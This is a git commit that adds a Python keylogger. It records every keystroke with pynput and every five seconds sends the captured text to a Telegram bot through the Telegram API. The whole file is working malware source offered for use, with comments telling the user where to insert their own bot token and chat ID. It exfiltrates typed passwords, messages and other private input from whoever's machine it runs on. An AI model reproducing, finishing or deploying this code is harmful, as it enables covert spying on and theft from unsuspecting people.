c5648117c539dab64c640c341095f489ee6a2220
b_illy__ <118596346+BiLLY-J03l@users.noreply.github.com>
2024-08-15 19:44:52 +0300

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,55 @@
+#!/usr/bin/env python3
+
+import pynput.keyboard
+import threading
+import requests
+
+
+log=""
+
+def append_to_log(string):
+    global log
+    log=log+string
+
+def send(msg):
+    print("[+] sending report..")
+    
+    #uncomment next two lines and add ur telegram bot token and chat id..
+    #token= "TELEGRAM TOKEN"
+    #chat_id="TELEGRAM CHAT ID"
+    
+    url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}"
+    json_data=requests.get(url).json()
+    if json_data['ok'] == True:
+        print("[+] Message Sent Successfully!")
+    elif json_data['ok'] == False:
+        print("[x] Message Not Sent(e.g empty message)..")
+
+def report():
+    global log
+    send(log)
+    log=""
+    timer=threading.Timer(5,report)
+    timer.start()
+
+def process_key_press(key):
+    global log
+    try:
+        log=log+str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log=log+" "
+        else:
+            log=log+" "+str(key)+" "
+
+
+def start():
+    keyboard_listener=pynput.keyboard.Listener(on_press=process_key_press)
+    with keyboard_listener:
+        report()
+        keyboard_listener.join()
+
+
+
+print("[+] STARTING KEYLOGGER...\n\n")
+start()
